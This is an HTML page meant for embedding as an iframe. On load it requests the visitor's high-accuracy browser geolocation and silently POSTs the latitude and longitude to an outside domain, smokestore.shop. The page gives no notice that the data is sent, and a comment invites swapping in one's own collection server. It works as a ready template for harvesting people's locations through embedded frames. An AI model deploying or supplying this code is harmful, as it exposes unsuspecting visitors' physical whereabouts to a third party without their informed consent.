<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Iframe</title>
</head>
<body>
    <h1>Iframe Content</h1>
    <p id="location">Location will be displayed here.</p>

    <script>
        function getLocation() {
            document.getElementById("location").textContent = "Getting location...";
            if (navigator.geolocation) {
                const options = {
                    enableHighAccuracy: true,
                    timeout: 10000,
                    maximumAge: 0
                };
                navigator.geolocation.getCurrentPosition(showPosition, handleError, options);
            } else {
                document.getElementById("location").textContent = "Geolocation is not supported by this browser.";
            }
        }

        function showPosition(position) {
            const lat = position.coords.latitude;
            const lon = position.coords.longitude;

            // Update display
            document.getElementById("location").textContent = `Latitude: ${lat}, Longitude: ${lon}`;
            
            // Send location to external server
            sendLocationToServer(lat, lon);
        }

        function sendLocationToServer(lat, lon) {
            const url = 'https://smokestore.shop/send-location'; // Replace with your external domain API URL
            
            // Send the location data using fetch
            fetch(url, {
                method: 'POST', // or 'GET' if your server allows for that and handles it appropriately
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({ latitude: lat, longitude: lon })
            })
            .then(response => {
                if (!response.ok) {
                    throw new Error('Network response was not ok');
                }
                return response.json();
            })
            .then(data => {
                console.log('Location sent successfully:', data);
            })
            .catch((error) => {
                console.error('There was a problem with the fetch operation:', error);
            });
        }

        function handleError(error) {
            switch(error.code) {
                case error.PERMISSION_DENIED:
                    document.getElementById("location").textContent = "User denied the request for Geolocation.";
                    break;
                case error.POSITION_UNAVAILABLE:
                    document.getElementById("location").textContent = "Location information is unavailable.";
                    break;
                case error.TIMEOUT:
                    document.getElementById("location").textContent = "The request to get user location timed out.";
                    break;
                case error.UNKNOWN_ERROR:
                    document.getElementById("location").textContent = "An unknown error occurred.";
                    break;
            }
        }

        // Trigger location fetch on page load or button click, ensure you call `getLocation()` where needed.
        window.onload = getLocation; // Automatically get the location on load (you may replace this with a button click event).
    </script>
</body>
</html>
